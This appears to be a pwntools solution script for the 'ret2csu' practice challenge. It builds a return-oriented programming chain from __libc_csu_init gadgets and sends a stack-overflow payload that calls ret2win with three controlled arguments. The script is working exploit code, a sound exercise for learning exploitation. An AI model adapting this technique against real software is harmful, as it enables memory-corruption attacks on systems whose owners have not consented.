#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2csu
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2csu')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  '.'

io = start()

"""
0x00000000004006a3: pop rdi; ret; 

First gadget - 
0x000000000040069a <+90>:	pop    rbx
0x000000000040069b <+91>:	pop    rbp
0x000000000040069c <+92>:	pop    r12
0x000000000040069e <+94>:	pop    r13
0x00000000004006a0 <+96>:	pop    r14
0x00000000004006a2 <+98>:	pop    r15
0x00000000004006a4 <+100>:	ret  

Second gadget - 
0x0000000000400680 <+64>:	mov    rdx,r15
0x0000000000400683 <+67>:	mov    rsi,r14
0x0000000000400686 <+70>:	mov    edi,r13d
0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
"""

ret2win = p64(0x400510)
arg_one = p64(0xdeadbeefdeadbeef)
arg_two = p64(0xcafebabecafebabe)
arg_three = p64(0xd00df00dd00df00d)
first_gadget = p64(0x000000000040069a)
second_gadget = p64(0x0000000000400680)
pop_rdi = p64(0x00000000004006a3)
init = p64(0x600e38)   # x/10gx &_DYNAMIC

buf = ""
buf += "A"*40
buf += first_gadget
buf += p64(0x0)   # we need rbx to be 0
buf += p64(0x1)   # set 0x1 to rbp
buf += init       # we need a valid func address because call dereferences it and then calls so cant put ret2win here
buf += arg_one
buf += arg_two
buf += arg_three

# Now move to second gadget
buf += second_gadget
buf += p64(0x0)  # add rsp,0x8
buf += p64(0x0)  # pop rbx
buf += p64(0x0)  # pop rbp
buf += p64(0x0)  # pop r12
buf += p64(0x0)  # pop r13
buf += p64(0x0)  # pop 14
buf += p64(0x0)  # pop r15
buf += pop_rdi   # This stuff is amazing, we can only control edi using gadget_two, so again need to put arg_one into rdi
buf += arg_one   # Before calling ret2win
buf += ret2win

io.sendline(buf)

write("in.txt", buf)   # I use this to debug gdb> r < in.txt
io.interactive()

